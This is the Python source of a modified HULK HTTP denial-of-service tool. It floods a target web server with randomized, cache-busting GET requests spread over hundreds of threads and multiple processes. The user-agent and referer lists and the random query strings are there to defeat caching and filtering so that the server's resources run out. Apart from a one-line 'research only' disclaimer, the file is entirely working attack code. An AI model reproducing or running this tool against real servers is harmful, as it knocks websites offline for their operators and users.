# -*- coding: UTF-8 -*-
# ----------------------------------------------------------------------------------------------
# HULK - HTTP Unbearable Load King
#
# this tool is a dos tool that is meant to put heavy load on HTTP servers in order to bring them
# to their knees by exhausting the resource pool, its is meant for research purposes only
# and any malicious usage of this tool is prohibited.
#
# author :  Barry Shteiman , version 1.0
# Modificado por : DtxdF , Version ¡Gracias Barry Shteiman!
# ----------------------------------------------------------------------------------------------


import requests
import sys
import threading
import multiprocessing
import random
import re
from time import sleep

#global params

url=''
host=''
headers_useragents=[]
headers_referers=[]
request_counter=0
flag=0
safe=0

def inc_counter():

    global request_counter
    
    request_counter+=1

def set_flag(val):
    
    global flag

    flag=val

def set_safe():
    
    global safe
    
    safe=1
	
# generates a user agent array
def useragent_list():

    global headers_useragents

    headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
    headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')

    return(headers_useragents)

# generates a referer array
def referer_list():

    global headers_referers

    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.usatoday.com/search/results?q=')
    headers_referers.append('http://engadget.search.aol.com/search?q=')
    headers_referers.append('http://' + host + '/')

    return(headers_referers)
	
#builds random ascii string
def buildblock(size):

    out_str = ''

    for i in range(0, size):
        a = random.randint(65, 90)
        out_str += chr(a)

    return(out_str)

#http request
def httpcall(url):

    useragent_list()
    referer_list()
    code=0
    
    if url.count("?")>0:
        param_joiner="&"
    else:
        param_joiner="?"

    _headers = {}
    _headers['User-Agent'] = random.choice(headers_useragents)
    _headers['Cache-Control'] = 'no-cache'
    _headers['Accept-Charset'] = 'ISO-8859-1,utf-8;q=0.7,*;q=0.7'
    _headers['Referer'] = random.choice(headers_referers) + buildblock(random.randint(5,10))
    _headers['Keep-Alive'] = str(random.randint(110,120))
    _headers['Connection'] = 'keep-alive'
    _headers['Host'] = host

    _tmp_url = url

    try:
        
        _request = requests.get(url, headers=_headers)
    
    except (requests.exceptions.HTTPError, requests.exceptions.ConnectionError, requests.exceptions.BaseHTTPError, requests.exceptions.ConnectTimeout):
        
        set_flag(1)
        code=500
    
    except Exception as e:
        
        print(e)
        #sys.exit()
        set_flag(2)

    else:

        if not (_request.status_code == 500):
    
            inc_counter()

            request = requests.get(_tmp_url, headers=_headers)

        else:

            set_flag(1)
            code=500

    return(code)		

    
#http caller thread 
class HTTPThread(threading.Thread):

    def run(self):

        try:
            while flag<2:
                code=httpcall(url)
                if (code==500) & (safe==1):
                    set_flag(2)
        except Exception as ex:
            pass

# monitors http threads and counts requests
class MonitorThread(threading.Thread):

    def run(self):

        previous=request_counter
        while flag==0:
            if (previous+100<request_counter) & ((previous < request_counter) or (previous > request_counter)):
                #print "%d Requests Sent" % (request_counter)
                previous=request_counter
        if flag==2:
            #print "\n-- HULK Attack Finished --"
            pass

#execute 
def _start(address, threads=500, safe=False):

    global url, host

    if (safe == True):

        set_safe()
    
    url = address

    if url.count("/")==2:
        
        url = url + "/"

    m = re.search(r'(http|https)://[a-zA-Z0-9]+(:\d{2,})?/?', address)
    host = m.group(0)
    
    for i in range(threads):
        
        t = HTTPThread()
        t.start()
    
    t = MonitorThread()
    t.start()

def main(address, iterations=10, process=15, threads=500, safe=False, referers=[], user_agents=[]):

    global flag, headers_referers, headers_useragents

    headers_referers = headers_referers+referers
    headers_useragents = headers_useragents+user_agents

    i = multiprocessing.Pool(process)

    for _ in range(iterations):

        p = i.Process(target=_start, args=(address, threads, safe))
        p.start()

    while(flag != 2):

        sleep(1)

    return(address)
